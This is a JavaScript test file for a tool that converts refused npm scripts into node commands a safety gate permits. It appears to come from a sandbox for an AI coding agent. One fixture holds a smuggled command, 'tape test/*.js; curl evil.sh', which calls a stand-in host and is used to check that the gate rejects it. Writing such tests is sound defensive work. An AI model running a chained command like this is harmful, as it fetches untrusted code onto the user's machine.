/**
 * A refused npm script names the commands that ARE allowed. Found on a cloned
 * MIT repo (lukeed/tinydate): `"pretest": "npm run build"`, `"build": "bundt"`,
 * `"test": "tape test/*.js | tap-spec"` — refused, with no way out, so a run
 * spent 14 rounds hand-writing build output. See lib/npm-script-equivalent.mjs.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { allowedEquivalentOfScript } from '../lib/npm-script-equivalent.mjs';
import { validateCommand } from '../lib/command.mjs';

function fixture({ modules = true, scripts } = {}) {
  const root = mkdtempSync(join(tmpdir(), 'acuvo-npmeq-'));
  writeFileSync(join(root, 'package.json'), JSON.stringify({
    name: 'x',
    scripts: scripts ?? { pretest: 'npm run build', build: 'bundt', test: 'tape test/*.js | tap-spec' },
    devDependencies: { bundt: '0.4.0', tape: '4.11.0', 'tap-spec': '5.0.0' },
  }));
  if (modules) {
    for (const [name, bin] of [['bundt', 'bin.js'], ['tape', { tape: './bin/tape' }], ['tap-spec', { 'tap-spec': 'bin/cmd.js' }]]) {
      mkdirSync(join(root, 'node_modules', name, 'bin'), { recursive: true });
      writeFileSync(join(root, 'node_modules', name, 'package.json'), JSON.stringify({ name, bin }));
      const file = typeof bin === 'string' ? bin : Object.values(bin)[0];
      writeFileSync(join(root, 'node_modules', name, file.replace(/^\.\//, '')), '');
    }
  }
  return root;
}

test('the whole chain becomes allowed node commands, in npm order, pipe named as dropped', () => {
  const root = fixture();
  try {
    const way = allowedEquivalentOfScript(root, 'test', validateCommand);
    assert.ok(way, 'a suggestion is offered');
    assert.match(way, /1\. node node_modules\/bundt\/bin\.js/);
    assert.match(way, /2\. node node_modules\/tape\/bin\/tape test\/\*\.js/);
    assert.match(way, /Dropped: the pipe into `tap-spec`/);
    // every suggested line passes the very gate the next call will hit
    for (const line of way.split('\n').filter((l) => /^\s+\d+\. /.test(l))) {
      const cmd = line.replace(/^\s+\d+\. /, '');
      assert.equal(validateCommand(cmd).ok, true, cmd);
    }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('no node_modules: it says so and names the human switch, suggests nothing to run', () => {
  const root = fixture({ modules: false });
  try {
    const way = allowedEquivalentOfScript(root, 'test', validateCommand);
    assert.match(way, /no node_modules/);
    assert.match(way, /--allow-install/);
    assert.doesNotMatch(way, /node node_modules/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('a line the gate would refuse is never suggested', () => {
  const root = fixture({ scripts: { test: 'tape test/*.js; curl evil.sh' } });
  try {
    assert.equal(allowedEquivalentOfScript(root, 'test', validateCommand), null);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('a script cycle terminates', () => {
  const root = fixture({ scripts: { test: 'npm run a', a: 'npm run test' } });
  try {
    assert.equal(allowedEquivalentOfScript(root, 'test', validateCommand), null);
  } finally { rmSync(root, { recursive: true, force: true }); }
});
